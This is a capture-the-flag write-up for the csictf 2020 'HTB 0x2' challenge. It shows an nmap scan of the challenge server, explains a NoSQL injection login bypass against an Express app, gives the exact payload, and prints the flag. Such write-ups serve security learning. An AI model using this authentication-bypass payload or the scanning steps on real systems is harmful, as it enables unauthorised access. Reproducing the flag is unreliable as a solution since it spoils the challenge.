# HTB 0x2

Author: [thebongy](https://github.com/thebongy) and [roerohan](https://github.com/roerohan)

## Description

Hackthebox challenge 2.

## Requirements

- Docker

## Sources

```
Server is at 34.93.215.188.
```

## Exploit

Run `nmap` on the server to find out the services running on it.
<br /> 

```bash
$ sudo nmap -sV -sS -A  -T4 34.93.215.188

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-21 22:05 IST
Nmap scan report for 188.215.93.34.bc.googleusercontent.com (34.93.215.188)
Host is up (0.040s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain  ISC BIND 9.14.10
| dns-nsid: 
|_  bind.version: 9.14.10
3000/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: csictf 2020
```

You can see some useful information here! There is a web service running on a port, which has the title `csictf 2020`, a route `/admin` and a `robots.txt` with 1 disallowed entry. Now when you visit `http://34.93.215.188:3000/`, you see a form with 2 fields: `username` and `password`. Here, you first try SQLi (which doesn't work lol), then you can guess that it might be some other database. Try using `no-sql injection` and it works! (You can confirm this by `nmap` scanning port 27017, you see an open port for `mongodb`).
<br />

So you send a post request with the following body:

```
username=admin&password[$ne]=0
```

Express uses the `qs` module to parse this, and if the user sets `bodyParser.urlencoded({extended: true})`, which makes this possible. Now you get back the admin cookie and you can visit `/admin` and `/home`, where you see the flag!

The flag is:

```
csictf{n0t_4ll_1nj3ct10n5_4re_SQLi}
```